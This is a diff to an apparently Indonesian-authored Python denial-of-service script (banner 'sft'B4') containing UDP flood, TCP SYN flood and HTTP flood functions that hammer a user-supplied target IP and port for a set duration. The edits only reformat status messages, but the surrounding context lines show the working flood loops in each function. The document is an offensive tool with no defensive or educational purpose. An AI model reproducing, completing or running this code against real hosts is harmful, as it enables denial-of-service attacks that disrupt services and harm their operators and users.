@@ -61,7 +61,7 @@ def udp_attack(target_ip, target_port, duration):
     while time.time() < end_time:
         udp_socket.sendto(packet_data, (target_ip, target_port))
         packets_sent += 1
-        print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» UDP attack completed. Total packets sent: {Fore.LIGHTGREEN_EX}{packets_sent}.")
+    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack completed. Total packets sent: {Fore.LIGHTGREEN_EX}{packets_sent}.")
 
 def tcp_syn_attack(target_ip, target_port, duration):
     # Memulai serangan TCP SYN pada target yang ditentukan.
@@ -77,13 +77,13 @@ def tcp_syn_attack(target_ip, target_port, duration):
             pass
         tcp_socket.close()
         packets_sent += 1
-        print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» TCP SYN attack completed. Total connection attempts: {Fore.LIGHTGREEN_EX}{packets_sent}.")
+    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX}» TCP SYN attack completed. Total connection attempts: {Fore.LIGHTGREEN_EX}{packets_sent}.")
 
 async def http_flood_attack(target_ip, target_port, duration): 
     # Melakukan serangan HTTP Flood pada target yang ditentukan.
     end_time = time.time() + duration
     requests_sent = 0
-    print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_ {Fore.LIGHTBLUE_EX}» HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}on {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}second.")
+    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
 
     async with aiohttp.ClientSession() as session:
         while time.time() < end_time:
@@ -93,7 +93,7 @@ async def http_flood_attack(target_ip, target_port, duration):
             except aiohttp.ClientError:
                 pass
 
-    print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» HTTP Flood attack completed. Total requests sent: {Fore.LIGHTGREEN_EX}{requests_sent}.")
+    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack completed. Total requests sent: {Fore.LIGHTGREEN_EX}{requests_sent}.")
 
 if __name__ == "__main__":
     display_banner()
@@ -112,5 +112,6 @@ if __name__ == "__main__":
         
     elif attack_type == 'HTTP':
         asyncio.run(http_flood_attack(target_ip, target_port, duration))
-        print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_ {Fore.LIGHTBLUE_EX}» HTTP Flood attack has been complite.")
+        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
+        
         
